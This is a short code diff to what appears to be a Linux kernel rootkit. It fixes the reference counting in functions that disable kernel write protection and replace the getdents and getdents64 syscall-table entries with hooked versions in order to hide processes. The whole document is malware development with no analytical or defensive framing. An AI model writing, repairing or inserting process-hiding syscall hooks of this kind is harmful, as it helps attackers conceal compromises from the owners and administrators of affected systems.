@@ -15,9 +15,7 @@ pid_list_t_ptr hidden_pids_tail = &hidden_pids;
 void
 hide_pids(void)
 {
-    if (atomic_inc_return(&getdents_install_count) >= 1) {
-        atomic_set(&getdents_install_count, 1);
-
+    if (atomic_inc_return(&getdents_install_count) == 1) {
         disable_protection();
         sys_calls[__NR_getdents] = (void *)g7_getdents;
         sys_calls[__NR_getdents64] = (void *)g7_getdents64;
@@ -28,9 +26,7 @@ hide_pids(void)
 void
 unhide_pids(void)
 {
-    if (atomic_dec_return(&getdents_install_count) < 0) {
-        atomic_set(&getdents_install_count, 0);
-
+    if (atomic_dec_return(&getdents_install_count) < 1) {
         if (sys_getdents) {
             disable_protection();
             sys_calls[__NR_getdents] = (void *)sys_getdents;
